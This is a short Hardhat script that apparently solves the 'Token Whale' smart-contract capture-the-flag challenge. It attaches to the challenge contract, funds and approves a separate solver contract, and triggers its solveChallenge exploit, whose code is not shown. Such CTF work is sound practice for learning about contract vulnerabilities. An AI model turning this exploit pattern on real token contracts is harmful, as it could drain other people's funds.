const { ethers } = require('hardhat');

const DEPLOY = false;
const CHALLENGE_ADDRESS = '0xD7CD5ac9B2A4bDD3060DDa445829896009B7F9Be';
const SOLVER_ADDRESS = '0xE19ad42a20D78CA3c6Cd21c53c7D61A83Ed4a155';

async function main() {
  const TokenWhaleChallenge = await ethers.getContractFactory('TokenWhaleChallenge');
  const contract = await TokenWhaleChallenge.attach(CHALLENGE_ADDRESS);

  const TokenWhaleChallengeSolver = await ethers.getContractFactory('TokenWhaleChallengeSolver');

  let solver;
  if (DEPLOY) {
    solver = await TokenWhaleChallengeSolver.deploy();
    await solver.deployed();
    console.log(`Solver address: ${solver.address}`);
  } else {
    solver = await TokenWhaleChallengeSolver.attach(SOLVER_ADDRESS);
  }

  await contract.transfer(solver.address, 400);
  await contract.approve(solver.address, 600);

  await solver.solveChallenge(CHALLENGE_ADDRESS, 600);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
